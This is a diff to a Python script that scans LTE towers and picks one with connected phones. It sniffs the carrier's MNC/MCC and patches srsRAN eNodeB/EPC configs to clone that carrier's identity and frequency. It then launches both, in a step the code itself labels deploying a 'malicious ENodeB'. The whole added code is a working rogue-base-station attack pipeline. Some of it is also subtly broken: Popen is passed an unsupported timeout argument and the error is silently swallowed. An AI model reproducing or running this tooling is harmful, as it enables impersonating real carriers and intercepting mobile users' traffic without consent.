@@ -2,6 +2,7 @@ import subprocess
 import time
 import signal_strength
 import mnc_sniff
+import sys
 import lte_nr_frequency as lte_freq
 
 
@@ -13,15 +14,43 @@ BANDS=[12]
 RSSI_CUTOFF = -40
 # BANDS=[2,4,12,13,17,66,71]
 
-# Modift the srsenb.conf file with the newly selected params
-def modify_conf():
-    pass
+def run_enb():
+    try:
+        subprocess.Popen(["sudo", "srsenb", "config/enb.conf"] + sys.argv[1:], timeout=60)
+    except:
+        pass
+
+def run_epc():
+    try:
+        subprocess.Popen(["sudo", "srsepc", "config/epc.conf"] + sys.argv[1:], timeout=60)
+    except:
+        pass
+
+
+# Modify the srsenb.conf file with the newly selected params
+def patch_enb(mnc, mcc, earfcn):
+    # Prepare sed commands
+    mcc_string = f"s/mcc = .*/mcc = {mcc}/g"
+    mnc_string = f"s/mnc = .*/mnc = {mnc}/g"
+    earfcn_string = f"s/dl_earfcn = .*/dl_earfcn = {earfcn}/g"
+
+    subprocess.run(["sed", "-i", mcc_string, "config/enb.conf"])
+    subprocess.run(["sed", "-i", mnc_string, "config/enb.conf"])
+    subprocess.run(["sed", "-i", earfcn_string, "config/enb.conf"])
+
+
+def patch_epc(mnc, mcc):
+    mcc_string = f"s/mcc = .*/mcc = {mcc}/g"
+    mnc_string = f"s/mnc = .*/mnc = {mnc}/g"
+
+    subprocess.run(["sed", "-i", mcc_string, "config/epc.conf"])
+    subprocess.run(["sed", "-i", mnc_string, "config/epc.conf"])
 
 
 def sniff_sib(tower):
     tower = tower.split(" ")
     freq = tower[2] + "e6"
-    mnc, mcc = mnc_sniff.find_mnc(freq)
+    mnc, mcc = mnc_sniff.find_mnc(LTESNIFFER_PATH, freq)
     return(mnc, mcc)
 
 
@@ -43,7 +72,6 @@ def parse_output(output):
             id = int(id.strip(","))
             if id > 2:
                 towers.append(line)
-
     return(towers)
 
 
@@ -105,6 +133,7 @@ def main():
         selected_tower = select_tower(towers)
         print(selected_tower)
         if detect_ue(selected_tower):
+            print("UE Detected, capturing MNC/MCC\n")
             break
         else:
             print("No UEs detected, select new tower")
@@ -113,6 +142,19 @@ def main():
     print("===== Sniffing SIB information =====")
     mnc, mcc = sniff_sib(selected_tower)
     print(f"MNC : {mnc}\nMCC : {mcc}")
+    
+    print("===== Patching srsRAN configs =====")
+    # get dl_earfcn
+    split_tower = selected_tower.split(" ")
+    dl_earfcn = split_tower[4].strip(",")[7:]
+
+    patch_enb(mnc, mcc, dl_earfcn)
+    patch_epc(mnc, mcc)
+
+    # Deploy malicious ENB
+    print("===== Deploy malicious ENodeB =====")
+    run_epc()
+    run_enb()
 
 
 if __name__ == "__main__":
